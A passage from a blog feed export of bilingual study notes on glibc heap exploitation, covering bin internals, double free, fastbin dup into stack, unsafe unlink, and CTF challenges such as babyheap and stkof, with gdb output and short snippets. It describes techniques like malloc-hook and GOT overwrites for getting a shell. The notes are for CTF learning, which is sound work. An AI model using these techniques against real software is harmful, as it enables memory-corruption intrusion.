<p>The <code>small bins</code> on x64 consists of chunk <code>sizes under 0x400</code> (1024 bytes), and on x86 consists of chunk sizes<code>under 0x200</code>(512 bytes), and the<code> large bin consists of values above those</code>.</p>
<p><strong>释放后，首先插入的是unsorted bin</strong><br>since the unsorted bin chunk could not serve the requested size of 0x1000, it was sorted to its corresponding list of in the small bin at idx 4<br>当再次分配但不满足要求时，将进行排序 到相应的bin上<br>若满足要求，就分配<br><a href="https://guyinatuxedo.github.io/25-heap/index.html">https://guyinatuxedo.github.io/25-heap/index.html</a></p>
<p>lagestbin 中还有fwd_nextsize and bk_nextsize</p>
<h3 id="Consolidation-合并"><a href="#Consolidation-合并" class="headerlink" title="Consolidation 合并"></a>Consolidation 合并</h3><p>相邻的空闲块都会合并</p>
<h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>The Top Chunk is essentially a large heap chunk that holds currently unallocated data.<br>first time calling malloc reiterate the top chunk holds unallocated data that isn’t in the bin list.</p>
<p>malloc will try to allocate chunks from the bin lists before allocating them from the top chunk</p>
<p>We can see that two things have happened to the top chunk. Firstly that it moved down <code>to 0x602120 from 0x602020</code> to make room for the new allocation from itself. Secondly, we see that it’s <code>size was shrunk by 0x100</code>, because of the 0x100 byte allocation from it.<br>低地址向高地址增长</p>
<p>depending on the version of malloc and if the chunk size is fast bin or tcache, this behavior doesn’t always show itself.<br>挨着top chunk，释放并不一定回到top chunk，旧的size值并不会清零，我的虚拟机上运行就变为<code>tcachebins </code></p>
<pre><code>gef➤  heap bins 
──────────────────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7f9fb80 ────────────────────────────────────────────────────────────────
Tcachebins[idx=14, size=0x100] count=1  ←  Chunk(addr=0x5555555592c0, size=0x100, flags=PREV_INUSE) </code></pre>
<p> one thing you will see us do a lot of is allocated a small chunk in between our freed chunks and the top chunk, just to prevent that consolidation.<br>攻击时，要阻止释放的chunk回到top chunk，所以中间放一个小块分配内存。</p>
<h2 id="main-arena"><a href="#main-arena" class="headerlink" title="main arena"></a>main arena</h2><p>contains the <code>head pointers </code>for the bin lists,<br>heap bins命令下可以显示</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>基于这些bug:<br>leverage the bugs and a bit of heap grooming to edit a freed chunk in one of the bin lists. Then from being able to edit a freed chunk in one of the bin lists we can launch a bin attack</p>
<pre><code>+--------------------+----------------------------+-----------------------+
|   Bug Used         |  Bin Attack                |   House               |
+--------------------+----------------------------+-----------------------+
|                    |  Fast Bin Attack           |   House of Spirit     |
|   Double Free      |  tcache attack             |   House of Lore       |
|   Heap Overflow    |  Unsorted Bin Attck        |   House of Force      |
|   Use After Free   |  Small / Large Bin Attck   |   House of Einherjar  |
|                    |  Unsafe Unlink             |   House of Orange     |
+--------------------+----------------------------+-----------------------+</code></pre>
<p>两大利器gef 和 源码 malloc.c<br>When you attempt to use LD_PRELOAD to have a binary use a specific libc file, you might find an issue if the linker’s are not compatible. </p>
<h2 id="fastbin-链表头插法"><a href="#fastbin-链表头插法" class="headerlink" title="fastbin 链表头插法"></a>fastbin 链表头插法</h2><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/double_free">https://heap-exploitation.dhavalkapil.com/attacks/double_free</a><br>分配 也是从头部开始分配</p>
<p>double free 原理，两次释放，将同一块重复加入链表中，分配自然重复使用了</p>
]]></content>
      <categories>
        <category>Heap</category>
      </categories>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap入门1</title>
    <url>/2021/03/12/heap%E5%85%A5%E9%97%A81/</url>
    <content><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code> &quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;</code> 更改glibc版本<br><code>pwd</code>显示当前目录<br><code>apropos</code>搜索man手册<br><code>gef-&gt;search-patten</code><br><code>objdump -M intel</code>汇编改为intel语法<br><code>set disassambly intel</code> gdb更改语法<br><code>b print </code>printf函数下断点</p>
<a id="more"></a>
<p>在gdb 里启动gef<br><code>(gdb) source ~/.gdbinit-gef.py</code></p>
<p>或者传递命令<br><code>gdb.attach(p,&quot;source ~/.gdbinit-gef.py&quot;)</code></p>
<hr>
<p><code>gef➤  heap-view </code></p>
<pre><code>gef➤  got

GOT protection: Partial RelRO | GOT functions: 3

[0x804c00c] printf@GLIBC_2.0  →  0x8049036
[0x804c010] __libc_start_main@GLIBC_2.0  →  0xf7ddcd40
[0x804c014] __isoc99_scanf@GLIBC_2.7  →  0x8049056</code></pre>
<hr>
<pre><code>gef➤  heap bins
gef➤  heap chunks

gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE)
    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE)
    [0x00005555555592a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592c0, size=0x20d50, flags=PREV_INUSE)  ←  top chunk
gef➤  x/6gx 0x5555555592c0
0x5555555592c0:    0x0000000000000000    0x0000000000000000
0x5555555592d0:    0x0000000000000000    0x0000000000000000
0x5555555592e0:    0x0000000000000000    0x0000000000000000
gef➤  x/6gx 0x5555555592c0-0x10
0x5555555592b0:    0x0000000000000000    0x0000000000020d51
0x5555555592c0:    0x0000000000000000    0x0000000000000000
0x5555555592d0:    0x0000000000000000    0x0000000000000000</code></pre>
<p>查看glibc版本</p>
<pre><code>┌─[✗]─[zentreisender@parrotos]─[~]
└──╼ $ldd --version
ldd ./program 显示链接器，加载器版本</code></pre>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><code>call malloc, it returns a pointer to a chunk</code><br>返回一个地址</p>
<p>64bit 一个chunk段16字节，32bit 8 字节</p>
<p>查看二进制文件依赖的动态链接库命令 ldd</p>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术</p>
<h3 id="RELRC"><a href="#RELRC" class="headerlink" title="RELRC"></a>RELRC</h3><p>Firstly, <code>PLT</code> needs to be located at <code>a fixed offset</code> from the .text section. Secondly, since GOT contains data used by different parts of the program directly, it needs to be allocated at a known static address in memory. Lastly, and more importantly, because the GOT is lazily bound it needs to be writable.</p>
<p><code>PLT GOT 的偏移都是 写死在文件上</code><br>the linker resolves all dynamically linked functions<code> at the beginning of the execution,</code> and then <code>makes the GOT read-only</code>. 这就是RELRC</p>
<p>In partial RELRO, the non-PLT part of the GOT section (.got from readelf output) is read only but <code>.got.plt is still writeable</code>. Whereas in complete RELRO, the entire GOT (.got and .got.plt both) is marked as read-only.</p>
<p><code>.got</code> Section 存放外部全局变量的 GOT 表，非延迟绑定<br><code>.got.plt</code> Section 存放外部函数的 GOT 表，例如 printf，采用延迟绑定。</p>
<p>.got is for relocations regarding global ‘variables’ while .got.plt is a auxiliary section to act together with .plt when resolving procedures absolute addresses</p>
<h2 id="编译安装glibc各版本"><a href="#编译安装glibc各版本" class="headerlink" title="编译安装glibc各版本"></a>编译安装glibc各版本</h2><p>下载源码后<br><a href="https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html">https://www.gnu.org/software/libc/manual/html_node/Configuring-and-compiling.html</a></p>
<h3 id="gcc10编译安装glibc-2-23"><a href="#gcc10编译安装glibc-2-23" class="headerlink" title="gcc10编译安装glibc 2.23"></a>gcc10编译安装glibc 2.23</h3><pre><code>../glibc-2.20/configure --prefix=/usr --enable-add-ons --with-headers=/usr/include --with-binutils=/usr/bin --disable-werror</code></pre>
<p><code>--disable-werror</code> 这项是忽略错误</p>
<h3 id="gcc10编译安装glibc-2-27"><a href="#gcc10编译安装glibc-2-27" class="headerlink" title="gcc10编译安装glibc 2.27"></a>gcc10编译安装glibc 2.27</h3><pre><code>CFLAGS=&quot;-g -fcommon -Og&quot; CXXFLAGS=&quot;-g -fcommon -Og&quot; ../glibc-2.27/configure --prefix=/glibc/2.27 --with-headers=/usr/include --with-binutils=/usr/bin --disable-werror </code></pre>
<p>我编译的时候报了重复定义的错误，加<code>-fcommon</code> 忽视</p>
<h2 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h2><h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><p> first-fit behavior.<code>If a chunk is free and large enough, malloc will select this chunk.</code></p>
<p>Whenever <code>any chunk</code> (not a fast chunk) is freed,<code> it ends up in the unsorted bin.</code> Insertion happens at the <code>HEAD of the list</code>.</p>
<p>fast chunks end up in fastbins. As mentioned earlier, fastbins maintain a singly linked list and chunks are inserted and deleted from the HEAD end。<code>头插法</code></p>
<h3 id="calc"><a href="#calc" class="headerlink" title="calc::"></a>calc::</h3><h4 id="索引计算公式：："><a href="#索引计算公式：：" class="headerlink" title="索引计算公式：："></a>索引计算公式：：</h4><p>The basic formula is as follows:</p>
<pre><code>        IDX = (CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
        On a 64 bit system the current values are:
                MINSIZE: 0x20
                MALLOC_ALIGNMENT: 0x10
        So we get the following equation:
        IDX = (CHUNKSIZE - 0x11) / 0x10</code></pre>
<h4 id="chunksize计算公式：："><a href="#chunksize计算公式：：" class="headerlink" title="chunksize计算公式：："></a>chunksize计算公式：：</h4><pre><code>It is calculated as follows:
        IF x + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)
        ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 
        =&gt; CHUNKSIZE = (x + 0x8 + 0xf) &amp; ~0xf</code></pre>
<p>64位下，将<code>最低四位置0</code>，因为size 总是16的倍数，要对齐</p>
<p>当 req=24 时，request2size(24)=32。0x18+0x8+0xf &amp; ~0xf = 0x20而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节</p>
<h3 id="fastbin-dup-c"><a href="#fastbin-dup-c" class="headerlink" title="fastbin_dup.c"></a>fastbin_dup.c</h3><p>**double-free **<br><a href="https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html">https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html</a><br>同一地址释放两次，再分配时，可以得到同一地址的两个指针，释放一个指针，但可通过另外一个指针操作释放的这个相同块，放入一些数据</p>
<p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">https://blog.csdn.net/chennbnbnb/article/details/109284780</a><br>glibc2.31 版本下double free<br>tcache全称是Thead Cache</p>
<p>首先要填充tcache bin，再分配释放后到 fastbin</p>
<h3 id="fastbin-dup-into-stack-c-2-23"><a href="#fastbin-dup-into-stack-c-2-23" class="headerlink" title="fastbin_dup_into_stack.c 2.23"></a>fastbin_dup_into_stack.c 2.23</h3><p>在2.31下触发free(): double free detected in tcache 2</p>
<p>fastbin 是单链，只有fd指针，指向下一个块<br>通过修改fd指针，指向一个伪造的fake chunk</p>
<pre><code>gef➤  x/15gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed twice]
0x602010:   0x0000000000602020  0x0000000000000000      &lt;-- fd pointer
0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]
0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer
0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
0x602050:   0x4343434343434343  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000020fa1
0x602070:   0x0000000000000000</code></pre>
<hr>
<pre><code>unsigned long long *d = malloc(8);
stack_var = 0x20;
*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code></pre>
<p>fastbin 的fd指针指向下一个空闲块的<code> metadata开始的地址处</code><br>malloc 返回的地址指向的是<code>user data开始处</code>，d是double free后的重复块地址，所以上面的赋值是 将<code>fake_chunk的metadata起始地址 赋给 块中的fd指针</code>，因为这是 d 是double free，虽然分配了，但<code>也指向空闲块中</code>，将chUnk fd 指针指向一个 fake chunk 的metadata起始地址处，即prev_size ; size=20; userdata。</p>
<pre><code>Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55555555a010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x7fffffffdd50, size=0x20, flags=)  ←  Chunk(addr=0x55555555a020, size=0x0, flags=) [incorrect fastbin_index] </code></pre>
<p>可以看到成功</p>
<p>typedef struct var newtype;<br>struct var 的别名为newtype、</p>
<h3 id="heap-consolidation"><a href="#heap-consolidation" class="headerlink" title="heap_consolidation"></a>heap_consolidation</h3><p>Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of attacks.<br>edit a freed chunk using a heap overflow bug to cause consolidation</p>
<p>overwrite the size to be 0x510, essentially clearing the previous in use bit. This way when we free this chunk, it will think that the previous chunk has been freed</p>
<p>这样就再分配后，就有两个指针指向同一个块</p>
<p>改写当前size中 is_prev位，使得释放当前块后，认为<code>前一个块是free的</code><br>heap_overflow </p>
<pre><code>ptr2 = malloc(0x500);
ptr2[-1] 指示size
ptr[-2] 指示prev_size</code></pre>
<p><code>fastbin_dup_consolidate.c 2.23</code><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate</a><br>利用在 large bin 的分配中 malloc_consolidate 机制绕过 fastbin 对 double free 的检查</p>
<p>malloc(0x400) small bins（回收最大值）后，<code>fastbin 中的跑到 small bins中</code><br>[+] small_bins[4]: fw=0x55555555b000, bk=0x55555555b000<br> →   Chunk(addr=0x55555555b010, size=0x50, flags=PREV_INUSE)</p>
<p>2.23 里malloc_consolidate，先回收 fastbins 里的到unsorted bin中，因为这个bin满足不了分配要来，按照大小 又到了small bins中，也有可能到达large bins中。</p>
<p><code>此时可以再free() 一次，因为该块不在fastbin，释放后归到fastbins中。</code></p>
<p>这样我们就相当于double free</p>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>一般称被释放后没有被设置为 NULL 的内存指针为<code> dangling pointer</code></p>
<p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p>
<p>释放块后，指向其的指针不清除，所以可以再用这个指针写入数据</p>
<h2 id="babyheap-2017"><a href="#babyheap-2017" class="headerlink" title="babyheap 2017"></a>babyheap 2017</h2><p>有点莽，说实话不是很懂<br><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2017-0ctf-babyheap">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2017-0ctf-babyheap</a><br><a href="https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html">https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html</a><br><a href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></p>
<p>GNU/Linux 2.6.32 对应着glibc 2.23版本</p>
<pre><code>┌─[zentreisender@parrotos]─[~/Documents/heap/题目]
└──╼ $file /glibc/2.23/lib/libc-2.23.so 
/glibc/2.23/lib/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /glibc/2.23/lib/ld-linux-x86-64.so.2, BuildID[sha1]=eb6c32093c3e8e3b1c03a382947ec4151d036d75, for GNU/Linux 2.6.32, with debug_info, not stripped</code></pre>
<hr>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>The first will involve <code>causing heap consolidation to get a libc infoleak</code>. The second will involve using <code>a Fastbin Attack to write a oneshot gadget to the hooc of malloc</code>. The libc infoleak will allow us to break ASLR in libc and know the address of everything, and writing over the malloc hook with a ROP gadget (that will call system) will <code>give us a shell</code> when we call malloc (we need the infoleak to figure out where the malloc hook and rop gadget are)<br>也可以使用chunck overlap泄露unsorted bin的地址</p>
<hr>
<p>题目不是原本的相同实现方法，但思想是不变的<br>开启了<code>relrc</code>,不能修改got；alloc pointers in a <code>random mmap area</code>. Therefore, we do not know the address to launch the <code>“unsafe unlink” attack</code></p>
<hr>
<h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p><code>v6 = __readfsqword(0x28u);</code><br>Read memory from a location specified by an offset relative to the beginning of the GS segment.<br><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-160">https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-160</a></p>
<pre><code>void* calloc (size_t num, size_t size);
Allocate and zero-initialize array
Size of each element.
pData = (int*) calloc (i,sizeof(int));</code></pre>
<p>fill 中size由自己定义，存在漏洞, the vulnerability is evident. We can fill the arbitrary length of input to the heap and overflow anything after that.</p>
<p><code>$readelf -s /glibc/2.23/lib/libc-2.23.so | grep __malloc_hook</code></p>
<p>我们想要做的是 泄露libc的基址，Heap overlap.<br>Overlapping two chunks to leak the address of the libc</p>
<p>将 chunk 4 释放掉，其 fd 指针会被设置为指向 unsorted bin 链表的头部，这个地址在 libc 中，且相对位置固定，利用它就可以算出 libc 被加载的地址<br>这时新的chunk2也指向fd , bk</p>
<p>调用 malloc() 时，首先判断 hook 函数指针是否为空，不为空则调用它。所以这里我们传入一个 one-gadget。<br><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
<p><code>gef➤  x/10gx (long long)(&amp;main_arena)-0x30</code></p>
]]></content>
      <categories>
        <category>heap</category>
      </categories>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>heap入门2</title>
    <url>/2021/03/20/heap%E5%85%A5%E9%97%A82/</url>
    <content><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code>objdump -M intel -D ./heap0 | grep winner</code><br><code>gef➤  help search-pattern </code></p>
<h2 id="nightmare"><a href="#nightmare" class="headerlink" title="nightmare"></a>nightmare</h2><h2 id="protostar-heap0"><a href="#protostar-heap0" class="headerlink" title="protostar:heap0"></a>protostar:heap0</h2><p><code>objdump -D heap0 | grep winner</code></p>
<pre><code>┌─[zentreisender@parrotos]─[~/Documents/nightmare/modules/24-heap_overflow/protostar_heap0]
└──╼ $objdump -M intel -D ./heap0 | grep winner
080484b6 &lt;winner&gt;:
080484e1 &lt;nowinner&gt;:</code></pre>
<p>简单的堆溢出，复制时没有检查大小</p>
<a id="more"></a>
<h2 id="protostar-heap1"><a href="#protostar-heap1" class="headerlink" title="protostar:heap1"></a>protostar:heap1</h2><p>strcpy 没有检查大小<br>第一次strcpy进行溢出，覆盖地址为got表中put地址，第二次向puts地址写入winner()函数地址，接下来调用puts()的时候，实际上调用到winner()</p>
<pre><code>gef➤  help search-pattern 
SearchPatternCommand: search a pattern in memory. If given an hex value (starting with 0x)</code></pre>
<p>可以用来搜索内存中值，打印位置</p>
<h2 id="protostar-heap2"><a href="#protostar-heap2" class="headerlink" title="protostar:heap2"></a>protostar:heap2</h2><p>%p 打印地址</p>
<pre><code>    00100ab3 48 8d 85        LEA        RAX=&gt;local_98,[RBP + -0x90]
             70 ff ff ff
    00100aba 48 83 c0 07     ADD        RAX,0x7</code></pre>
<p>The strdup() function returns a pointer to a new string which is a duplicate of the string s.  Memory for the new string is obtained with malloc(3), and can be freed with free(3).</p>
<p>复制时 没有大小检查，且是分配在堆上</p>
<h2 id="Unlink-explannation"><a href="#Unlink-explannation" class="headerlink" title="Unlink() explannation"></a>Unlink() explannation</h2><p><a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344">https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</a><br>malloc 代码 里有unlink</p>
<h3 id="什么是unlink攻击"><a href="#什么是unlink攻击" class="headerlink" title="什么是unlink攻击"></a>什么是unlink攻击</h3><p>The most common scenario is a vulnerable <code>buffer that can be overflow </code>and has <code>a global pointer</code>. 要是全局变量  </p>
<ol>
<li>要有溢出漏洞</li>
<li>chunk地址存在一指针数组中，且是全局变量</li>
</ol>
<p><code>unlink()</code> 是将双向链表的 块拿出来， 就需要重新调整 fd 和 bk 指针<br>例如 free 时和目前物理相邻的 free chunk 进行合并<br>It handles the process of overwriting pointers from the next and previous chunks to the other, to fill in the gap from taking out the chunk in the middle.</p>
<h3 id="第一个检查：："><a href="#第一个检查：：" class="headerlink" title="第一个检查：："></a>第一个检查：：</h3><p>The first check we need to worry about, is it checks if the Fd and Bk pointers of our fake heap chunk (they point to the next and previous chunks) point to chunks that have <code>pointers back</code> to our fake chunk.</p>
<hr>
<p>构建一个fake chunk，这个chunk 可以在已申请的chunk中构建，因为我们可以写入值。<br><code>temp = (uint64_t *)ptr0[2]; </code> 将fd的值指针化后赋给 temp<br><code>printf(&quot;Fd-&gt;bk:    \t\t%p\n&quot;, (void *)temp[3]); </code><br>%p 按十六进制输出数据 </p>
<h3 id="void-为”无类型指针”"><a href="#void-为”无类型指针”" class="headerlink" title="void * 为”无类型指针”"></a>void * 为”无类型指针”</h3><p>内存分配函数 malloc 函数返回的指针就是 void * 型，用户在使用这个指针的时候，要进行强制类型转换，也就是显式说明该指针指向的内存中是存放的什么类型的数据 (int <em>)malloc(1024) 表示强制规定 malloc 返回的 void</em> 指针指向的内存中存放的是一个个的 int 型数据。</p>
<hr>
<h3 id="fake-chunk-fd-bk"><a href="#fake-chunk-fd-bk" class="headerlink" title="fake_chunk fd bk"></a>fake_chunk fd bk</h3><p>fd 在<code>0x10</code> 偏移处，bk 在<code>0x18</code>偏移处<br>fake= ptr0<br>target=ptr0<br><code>fake-&gt;fd = target-0x18 =FD </code>减0x18是因为下面是<code>取 bk </code><br>因为 FD-&gt; bk = fake FD的其他结构值都不重要，只要bk值，这里就是&amp;target，这个地址保存着fake chunk metadata的开始地址，即ptr0<br><code>target-0x18+0x18 = fake chunk = ptr0</code></p>
<p>同理</p>
<pre><code>fake-&gt;bk=target-0x10 =BK
BK-&gt;fd = fake = ptr0
target-0x10 + 0x10 =ptr0</code></pre>
<p>we will edit the <code>heap metadata of the second chunk</code>, so that it will say that the previous chunk has been freed and it points to our fake chunk.<br>只要设置<code>prev_size</code>，到metadata开始处，就认为是其前一个块</p>
<p>Then when we free the second chunk, it will cause our fake chunk to <code>be unlinked</code> and execute the <code>pointer write</code>.<br>will check that the size of our chunk is equal to the previous size of the chunk being freed<br><strong>利用堆溢出 来修改</strong></p>
<hr>
<p>The final check we have to worry about is for fd_nextsize. Essentially it just checks to see if it is equal to 0x0, and if it is it skips a bunch of checks.<br>现在不为0才跳过一些检查</p>
<h3 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h3><pre><code>struct malloc_chunk &#123;
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
&#125;;</code></pre>
<p>双向链表结构的bin中，fd_nextsize 指向下一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>bk_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>就是 bk 接下来的8字节，</p>
<h3 id="unlink-写操作"><a href="#unlink-写操作" class="headerlink" title="unlink 写操作"></a>unlink 写操作</h3><p>unlink操作如下：：</p>
<pre><code>FD = fake-&gt;fd;
BK = fake-&gt;bk;
FD-&gt;bk = BK
BK-&gt;fd = FD</code></pre>
<p>那么最后，<code>BK-&gt;fd = FD</code><br>Fd pointer: 0x55d9452cf038<br>Bk  pointer: 0x55d9452cf040<br>Bk-&gt;Fd:            0x55d946d5d420  即target地址存储的值<br>*target=fd=0x55d9452cf038</p>
<p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#unsafe_unlink">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#unsafe_unlink</a><br>这时 chunk0_ptr 和 chunk0_ptr[3] 实际上就是同一东西。这里可能会有疑惑为什么这两个东西是一样的，因为 chunk0_ptr 指针在是放在数据段上的，<strong>地址在 0x601070</strong>，<strong>指向 0x601058</strong>，而 chunk0_ptr[3] 的意思是从 chunk0_ptr <strong>指向的地方</strong>开始数 3 个单位，所以 *<em>0x601058+0x08</em>3=0x601070**</p>
<p>所以给chunk0[3] 赋值 就相当于给chunk赋值，最后chunk[0] 为改写地址处的内容<br>chunk0是指针（重要）<br>&amp;chunk0[3]==&amp;chunk0</p>
<h2 id="nightmare-HITCON’14-stkof"><a href="#nightmare-HITCON’14-stkof" class="headerlink" title="nightmare HITCON’14: stkof"></a>nightmare HITCON’14: stkof</h2><p><code>00602100</code><br>Our exploitation process will contain two parts. The first will be<code> doing an Unlink Attack</code>, and the second will be a <code>GOT overwrite / infoleak</code>.</p>
<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>Unlinking for the heap is the process of removing a chunk from a bin list (in this case for heap consolidation for performance improvement reasons).</p>
<p>What this attack will do is <code>give us a write</code>.<br>However there are a lot of restrictions on what we can write and where we can write.<br>Essentially when an unlink happens, it will write pointers to a chunk to fill in the gap of the chunk that was taken out.<br>这就是写的来源<br>因为最后<code>BK-&gt;fd=FD</code></p>
<p>本题中指针ptr，所在是一个指针数组，数组中的内容是指针，指向其他地方<br>首先我们要有一个指向 一个chunk块的指针ptr，来使得bk-&gt;fd 和 fd-&gt;bk指向fake chunk<br>题目中malloc后地址</p>
<pre><code>                /* 将块地址保存在这里 */
*(void **)(&amp;DAT_00602140 + (long)(int)DAT_00602100 * 8) = pvVar1;


    004009a8 48 98           CDQE
    004009aa 48 8b 55 88     MOV        RDX,qword ptr [RBP + local_80]
                         将块地址保存在这里
    004009ae 48 89 14        MOV        qword ptr [DAT_00602140 + RAX*0x8],RDX
             c5 40 21 
             60 00</code></pre>
<p>动态运行下就知道地址</p>
<pre><code> →   0x4009ae                  mov    QWORD PTR [rax*8+0x602140], rdx
此时$rax   : 0x1               
所以保存在地址0x602148</code></pre>
<p>接着来设置 fake chunk 的fd , bk指针</p>
<p>所以先分配两个块，这两个块不一定要相邻在一起，相邻可以简单地使用堆溢出，也好融合，然后在第一个块中创建fake chunk， 在free第二个块后，触发Unlink </p>
<pre><code>那么fake chunk fd=ptr-0x18   , fd-&gt;bk=ptr
fake chunk bk=ptr-0x10 , bk -&gt;fd=ptr</code></pre>
<p>然后是设置size, pre_size和size要相符，然后是fd_nextsize == null （在glibc2.23下）</p>
<p>unlink 后<br><code>*ptr=ptr-0x8*3</code><br>可以用来got覆写</p>
<h3 id="GOT-Overwrite-Infoleak"><a href="#GOT-Overwrite-Infoleak" class="headerlink" title="GOT Overwrite / Infoleak"></a>GOT Overwrite / Infoleak</h3><p>现在有了一个指向指针数组的指针<br>就可以 向数组中写入指针</p>
<hr>
<p><a href="https://github.com/Finsenty54/attack-code/blob/master/heap/Hitcon_2014_stkof/myexploit.py">https://github.com/Finsenty54/attack-code/blob/master/heap/Hitcon_2014_stkof/myexploit.py</a><br>代码以及注解</p>
<h2 id="zctf-2016-note2"><a href="#zctf-2016-note2" class="headerlink" title="zctf 2016 note2"></a>zctf 2016 note2</h2><p>把名字放在这里006020e0<br>最多四个块</p>
<hr>
<p><code>DAT_00602120</code>分配的块的地址放在这里，8字节，顺序排列<br>相应块的输入值大小放在DAT_00602140</p>
<p>这些位置在<code>bss</code>中，全局未初始化变量</p>
<pre><code>Chunk(addr=0x108c2a0, size=0x90, flags=PREV_INUSE)
    [0x000000000108c2a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x108c330, size=0x90, flags=PREV_INUSE)
    [0x000000000108c330     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x108c3c0, size=0x90, flags=PREV_INUSE)
    [0x000000000108c3c0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x108c450, size=0x90, flags=PREV_INUSE)
    [0x000000000108c450     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x108c4e0, size=0x20b30, flags=PREV_INUSE)  ←  top chunk
gef➤  x/32gx 0x00602120
0x602120:    0x000000000108c2a0    0x000000000108c330
0x602130:    0x000000000108c3c0    0x000000000108c450</code></pre>
<p>自带的libc-2.19.so 太老了，使用2.23</p>
